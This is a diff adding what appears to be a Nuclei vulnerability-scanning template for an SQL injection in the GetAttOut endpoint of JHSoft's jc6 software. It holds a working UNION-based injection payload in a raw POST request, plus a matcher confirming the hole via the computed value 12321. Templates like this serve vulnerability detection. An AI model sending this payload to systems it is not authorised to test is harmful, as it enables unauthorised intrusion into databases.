@@ -1,0 +1,23 @@
+id: jc6-GetAttOut-sqli
+info:
+  name: jc6-GetAttOut-sqli
+  author: jc6-GetAttOut-sqli
+  severity: high
+
+requests:
+  - raw:
+      - |
+        POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Connection: close
+ 
+        1' union select null,null,111*111,null,null,null--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"attOEndTime","success",'12321')
